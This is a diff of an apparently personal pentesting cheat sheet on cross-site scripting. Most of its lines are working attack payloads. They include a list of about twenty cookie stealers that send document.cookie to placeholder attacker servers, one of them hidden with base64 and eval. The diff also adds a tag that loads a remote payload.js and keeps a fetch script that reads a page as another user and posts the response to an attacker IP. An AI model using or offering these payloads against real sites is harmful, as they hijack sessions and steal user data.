@@ -14,10 +14,34 @@ Search Tag: #📕
 ___
 
 ## Description:  
+https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+
+### Good test payloads
+```
+<img src =q onerror=prompt(8)>
+```
 
 ### Classic Cookie Stealer
 ```
-<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
+<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
+<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
+<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
+<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
+<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
+<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
+<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
+<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
+<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
+<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
+<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
+<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
 ```
 Here we have used btoa() method for converting the cookie string into base64 encoded string.
 Setup http server to catch responses:
@@ -28,9 +52,7 @@ python3 -m http.server -m 80
 
 ### Downloader for longer XSS payloads
 ```
-<script>
-var a=document.createElement(“script”);a.src=http://localhost:8000/steal_jwt.js;document.body.appendChild(a);
-</script
+<script src=http://10.10.14.23:80/payload.js>
 ```
 
 ### stealing value set in a response (such as a jwt token)
@@ -59,7 +81,6 @@ https://www.shorebreaksecurity.com/blog/xss-exploitation-with-xhr-response-chain
 
 ### Javascript to make a request to a page as another user
 
-
 ```
 
 var data = new URLSearchParams('email[$ne]=1&password[$regex]=^69.*$');
@@ -76,12 +97,12 @@ fetch('http://staff-review-panel.mailroom.htb/auth.php', {
 	fetch('http://10.10.14.23/post', {
 		method: 'POST',
 		headers: {
-		'Content-Type': 'text/plain'
-	},
-	body: data
-})
-	.then(response => console.log('Data sent:', response));
-});
+			'Content-Type': 'text/plain'
+		},
+			body: data
+		})
+			.then(response => console.log('Data sent:', response));
+	});
 
 ```
 
